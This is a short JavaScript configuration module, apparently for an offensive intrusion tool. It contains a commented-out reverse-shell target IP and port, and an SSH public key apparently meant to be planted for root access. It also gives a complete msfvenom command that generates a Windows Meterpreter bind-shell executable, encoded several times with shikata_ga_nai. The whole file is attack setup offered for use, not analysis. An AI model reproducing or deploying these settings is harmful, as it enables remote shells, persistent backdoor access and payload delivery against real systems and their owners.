module.exports = {
	reverShell:null,//{ip:"162.219.126.11", port:80},
	// ssh-keygen
	xKeys:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001",
	noWwwBind:
	   {
	   	 win:"msfvenom --platform windows x86/shikata_ga_nai -b '\\x00' -i 8 -f exe -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=65533  -o payload/noWWW_P65533.exe"
	   }
};
